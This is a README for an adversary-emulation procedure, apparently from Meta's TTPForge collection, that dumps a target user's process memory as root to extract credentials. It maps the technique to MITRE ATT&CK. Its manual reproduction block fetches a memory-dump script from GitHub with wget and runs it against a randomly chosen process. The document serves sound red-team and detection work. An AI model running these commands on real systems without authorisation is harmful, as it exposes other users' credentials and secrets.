# Extract Secrets from Memory

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP dumps the memory of a process for a target user as root. It uses the `memory-dump.sh` script from the [bash-memory-dump](https://github.com/hajzer/bash-memory-dump) repository to perform the memory dump.

## Arguments

- **target_user**: The username of the target user whose process memory will be dumped. Defaults to "root".

## Prerequisites

1. This TTP must be run as the root user in order to successfully dump the memory of a process owned by another user.

## Usage

You can run the TTP using the following example:
```bash
ttpforge run forgearmory//credential-access/extract-secrets-from-memory/ttp.yaml
```

## Steps

1. Make the script executable.
2. Clone [bash-memory-dump](https://github.com/hajzer/bash-memory-dump) (1fbb54871f6fdd8fc90d181d6705749ea0d797c6) from Github.
3. Run the `memory-dump.sh` script to dump the memory of a random process owned by the target user. The memory dump is saved in a directory named "MEMDUMPS-of-PID-{pid}", where {pid} is the process ID of the target process.
4. Check if the memory dump was successfully created. If it was, the TTP exits with a success message. Otherwise, it exits with an error message.

## Manual Reproduction Steps

```
# Escalate privileges to root
sudo su

# Download memory-dump
wget https://raw.githubusercontent.com/hajzer/bash-memory-dump/master/memory-dump.sh

target_user='root'
target_pids=( $(ps -u ${target_user} | awk -F ' ' '{print $1}') )

# Pick random PID from the list
rand_pid="$(echo ${target_pids[RANDOM%${#target_pids[@]}]})"

# Run memory-dump
sudo bash -x memory-dump.sh -p "${rand_pid}" -m all -d dd

# Clean up
rm -rf "MEMDUMPS-of-PID-${rand_pid}"
rm memory-dump.sh
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0006 Credential Access
- **Techniques**:
  - T1003 OS Credential Dumping
- **Subtechniques**:
  - T1003.007 OS Credential Dumping Proc Filesystem
